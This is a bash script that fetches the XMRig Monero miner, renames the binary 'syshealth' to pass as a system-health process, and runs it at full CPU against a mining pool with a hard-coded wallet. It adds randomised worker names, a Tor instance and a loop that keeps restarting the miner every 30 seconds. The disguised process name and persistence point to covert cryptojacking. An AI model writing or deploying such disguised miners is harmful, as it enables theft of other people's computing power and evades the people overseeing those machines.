#!/bin/bash
# all_in_one_local_run.sh - One-command local setup and run for syshealth miner
# Usage: bash all_in_one_local_run.sh

# --- CONFIGURE THESE ---
WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="gulf.moneroocean.stream:10128"
CPU_PCT=100
# Generate a random worker name each run (e.g., worker-<6 random chars>)
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
# ----------------------

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
PREFS_FILE="$CONFIG_DIR/preferences.json"

# Ensure dependencies
for dep in curl jq tor; do
  if ! command -v $dep >/dev/null 2>&1; then
    echo "$dep not found. Installing..."
    sudo apt-get update && sudo apt-get install -y $dep
  fi
done

# Download syshealth (XMRig) if not present
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  XMRIG_VERSION="6.21.0"
  echo "Downloading XMRig $XMRIG_VERSION..."
  curl -L -o /tmp/xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
  tar -xzf /tmp/xmrig.tar.gz -C /tmp
  mv "/tmp/xmrig-${XMRIG_VERSION}/xmrig" "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig* /tmp/xmrig-${XMRIG_VERSION}
fi

# Create config directory if needed
mkdir -p "$CONFIG_DIR"

# Generate preferences.json (XMRig compatible config )
cat > "$PREFS_FILE" <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": $CPU_PCT
  },
  "pools": [
    {
      "url": "$POOL_URL",
      "user": "$WALLET.$WORKER_NAME",
      "pass": "x",
      "keepalive": true,
      "tls": false
    }
  ],
  "log-file": "$SCRIPT_DIR/xmrig.log"
}
EOF

# --- Tor setup ---
TORRC="/tmp/torrc_local"
TORDATA="/tmp/tor_data_local"
if [ ! -f "$TORRC" ]; then
  cat > "$TORRC" <<EOF
DataDirectory $TORDATA
SocksPort 9050
Log notice stdout
EOF
fi
mkdir -p "$TORDATA"
if ! pgrep -x tor > /dev/null; then
  nohup tor -f "$TORRC" > /dev/null 2>&1 &
  echo "Tor started."
else
  echo "Tor already running."
fi

# --- Scheduler ---
LOGFILE="$SCRIPT_DIR/xmrig_out.log"
echo "Starting scheduler loop (ctrl+c to stop)..."
while true; do
  if ! pgrep -x tor > /dev/null; then
    echo "[all_in_one] Tor not running. Restarting..."
    nohup tor -f "$TORRC" > /dev/null 2>&1 &
  fi
  if ! pgrep -f "$SCRIPT_DIR/syshealth" > /dev/null; then
    echo "[all_in_one] syshealth not running. Restarting..."
    nohup "$SCRIPT_DIR/syshealth" --config="$PREFS_FILE" >> "$LOGFILE" 2>&1 &
  fi
  sleep 30
done
